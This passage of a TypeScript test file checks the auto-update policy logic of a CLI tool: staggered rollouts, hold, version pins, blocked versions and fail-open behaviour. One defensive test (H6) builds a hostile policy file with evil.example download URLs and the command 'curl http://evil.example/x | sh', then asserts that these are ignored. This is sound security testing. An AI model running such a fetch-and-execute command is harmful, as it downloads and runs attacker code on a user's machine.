    const tgz = readFileSync(tgzPath);
    const entry = { tgz, integrity: integrityField(tgz) };
    store.set(version, entry);
    return entry;
}

async function runCheck(mod: UpdateModule, harness: Harness, force: boolean): Promise<void> {
    await mod.checkForUpdate({
        packageName: "billion-context",
        currentVersion: "1.2.3",
        autoUpdate: true,
        installDir: harness.installDir,
    }, force);
}

function swapEnv(vars: Record<string, string>): () => void {
    const saved: Record<string, string | undefined> = {};
    for (const [k, v] of Object.entries(vars)) {
        saved[k] = process.env[k];
        process.env[k] = v;
    }
    return () => {
        for (const [k, v] of Object.entries(saved)) {
            if (v === undefined) delete process.env[k];
            else process.env[k] = v;
        }
    };
}

interface ScenarioOpts {
    policyBody?: string;
    policyFail?: boolean;
}

async function withPolicyScenario(name: string, opts: ScenarioOpts, scenario: (mod: UpdateModule, harness: Harness, reg: { hits: string[] }) => Promise<void>): Promise<void> {
    await test(name, async () => {
        const mod = await getUpdateModule();
        const harness = makeHarness();
        freshCacheDir();
        freshConfigDir();
        // scenarios may pre-seed state files before the first check runs
        mkdirSync(cacheDir(), { recursive: true });
        // point owner-lane scans (dsh profiles / pi home) at empty dirs so post-install
        // convergence stays inert even on machines that have real ones
        const restoreEnv = swapEnv({
            DSH_HOME: path.join(harness.root, "dsh-empty"),
            PI_CODING_AGENT_DIR: path.join(harness.root, "pi-empty"),
            PI_HOME: path.join(harness.root, "pi-empty"),
            BILI_UPDATE_STAGGER_MIN_MS: String(MIN),
            BILI_UPDATE_STAGGER_MAX_MS: String(2 * MIN),
            BILI_UPDATE_POLICY_URL: "http://policy.test/auto-update-policy.json",
        });
        mkdirSync(process.env.DSH_HOME!, { recursive: true });
        mkdirSync(process.env.PI_CODING_AGENT_DIR!, { recursive: true });
        mod._resetUpdateThrottleForTest();
        mod._resetInstallBackoffForTest();
        mod._resetPolicyGateForTest();
        _resetUpdatePolicyForTest();
        const reg = mockRegistry({
            latestVersion: "1.2.5",
            published: ["1.2.3", "1.2.4", "1.2.5"],
            policyBody: opts.policyBody ?? JSON.stringify({ schemaVersion: 1 }),
            policyFail: opts.policyFail,
        });
        try {
            await scenario(mod, harness, reg);
        } finally {
            reg.restore();
            restoreEnv();
            rmSync(harness.root, { recursive: true, force: true });
        }
    });
}

test("H1: stagger spreads the upgrade — future draw blocks, persisted draw survives re-checks, due draw installs", async () => {
    await withPolicyScenario("stagger gates the automatic upgrade end-to-end", {}, async (mod, harness, reg) => {
        const before = Date.now();
        await runCheck(mod, harness, false);
        assert.equal(harness.diskVersion(), "1.2.3");
        const staggerFile = path.join(cacheDir(), ".update-stagger.json");
        assert.ok(existsSync(staggerFile), "the draw must be persisted");
        const raw = JSON.parse(readFileSync(staggerFile, "utf-8")) as { draws: Record<string, number> };
        const draw = raw.draws["latest:1.2.5"];
        assert.ok(draw !== undefined, "draw keyed by tag:version");
        assert.ok(draw >= before + MIN && draw <= before + 2 * MIN + 5_000, `draw inside [now+${MIN}, now+${2 * MIN}]: ${draw}`);
        assert.ok(!reg.hits.some((u) => u.includes("/tar/")), "no tarball download while waiting");

        // simulate a restart + another check cycle: NO re-roll, still waiting
        mod._resetUpdateThrottleForTest();
        _resetUpdatePolicyForTest();
        await runCheck(mod, harness, false);
        assert.equal(harness.diskVersion(), "1.2.3");
        const raw2 = JSON.parse(readFileSync(staggerFile, "utf-8")) as { draws: Record<string, number> };
        assert.equal(raw2.draws["latest:1.2.5"], draw, "persisted draw must not re-roll across restarts");

        // the moment arrives (clock moves past the draw) → the upgrade lands
        mod._resetUpdateThrottleForTest();
        writeFileSync(staggerFile, JSON.stringify({ v: 1, draws: { "latest:1.2.5": Date.now() - 1000 } }));
        await runCheck(mod, harness, false);
        assert.equal(harness.diskVersion(), "1.2.5");
        assert.ok(reg.hits.some((u) => u.endsWith("/tar/1.2.5.tgz")));
    });
});

test("H2: manual `bili update` (force) bypasses the stagger", async () => {
    await withPolicyScenario("force bypasses the stagger draw", {}, async (mod, harness) => {
        await runCheck(mod, harness, true);
        assert.equal(harness.diskVersion(), "1.2.5");
    });
});

test("H3: hold freezes automatic upgrades but not manual ones", async () => {
    await withPolicyScenario("hold is a brake, not a deadlock", { policyBody: JSON.stringify({ schemaVersion: 1, hold: true }) }, async (mod, harness) => {
        await runCheck(mod, harness, false);
        assert.equal(harness.diskVersion(), "1.2.3");
        mod._resetUpdateThrottleForTest();
        await runCheck(mod, harness, true);
        assert.equal(harness.diskVersion(), "1.2.5");
    });
});

test("H4: pinned ceiling installs the highest version UNDER the pin", async () => {
    await withPolicyScenario("pin ceiling", { policyBody: JSON.stringify({ schemaVersion: 1, pinned: "1.2.4" }) }, async (mod, harness, reg) => {
        // pre-date the draw so the scenario isolates the pin, not the stagger
        writeFileSync(path.join(cacheDir(), ".update-stagger.json"), JSON.stringify({ v: 1, draws: { "latest:1.2.4": Date.now() - 1000 } }));
        await runCheck(mod, harness, false);
        assert.equal(harness.diskVersion(), "1.2.4");
        assert.ok(reg.hits.some((u) => u.endsWith("/tar/1.2.4.tgz")));
        assert.ok(!reg.hits.some((u) => u.endsWith("/tar/1.2.5.tgz")));
    });
});

test("H5: blocked latest steps down to the next published version", async () => {
    await withPolicyScenario("blocked stepping", { policyBody: JSON.stringify({ schemaVersion: 1, blocked: ["1.2.5"] }) }, async (mod, harness) => {
        writeFileSync(path.join(cacheDir(), ".update-stagger.json"), JSON.stringify({ v: 1, draws: { "latest:1.2.4": Date.now() - 1000 } }));
        await runCheck(mod, harness, false);
        assert.equal(harness.diskVersion(), "1.2.4");
    });
});

test("H6: security boundary — the policy file cannot steer installs to foreign URLs/versions", async () => {
    await withPolicyScenario("hostile policy fields are inert", {
        policyBody: JSON.stringify({
            schemaVersion: 1,
            installUrl: "http://evil.example/backdoor.tgz",
            tarballUrl: "http://evil.example/backdoor.tgz",
            downloadFrom: "http://evil.example/",
            command: "curl http://evil.example/x | sh",
            blocked: ["http://evil.example/1.2.5", "not-a-version"],
            pinned: "http://evil.example/1.2.4",
        }),
    }, async (mod, harness, reg) => {
        writeFileSync(path.join(cacheDir(), ".update-stagger.json"), JSON.stringify({ v: 1, draws: { "latest:1.2.5": Date.now() - 1000 } }));
        await runCheck(mod, harness, false);
        // garbage pin/block entries were dropped → plain latest installed from the REAL registry
        assert.equal(harness.diskVersion(), "1.2.5");
        assert.ok(!reg.hits.some((u) => u.startsWith("http://evil.")), `no request may ever reach the hostile URLs: ${reg.hits.filter((u) => u.startsWith("http://evil."))}`);
    });
});

test("H7: unreachable policy source fails open to local defaults (stagger still applies)", async () => {
    await withPolicyScenario("fail-open on policy outage", { policyFail: true }, async (mod, harness) => {
        // drop the narrow local window so the built-in 15min..48h defaults apply
        delete process.env.BILI_UPDATE_STAGGER_MIN_MS;
        delete process.env.BILI_UPDATE_STAGGER_MAX_MS;
        await runCheck(mod, harness, false);
        assert.equal(harness.diskVersion(), "1.2.3");
        const st = getUpdatePolicyState()!;
        assert.equal(st.source, "local-default");
        assert.ok(st.error);
        const raw = JSON.parse(readFileSync(path.join(cacheDir(), ".update-stagger.json"), "utf-8")) as { draws: Record<string, number> };
        const draw = raw.draws["latest:1.2.5"];
        assert.ok(draw !== undefined && draw > Date.now() + STAGGER_MIN_DELAY_DEFAULT_MS - 1000, "built-in 15min floor still staggers");
    });
});

test("cleanup: remove scratch roots", () => {
    rmSync(scratchRoot, { recursive: true, force: true });
});
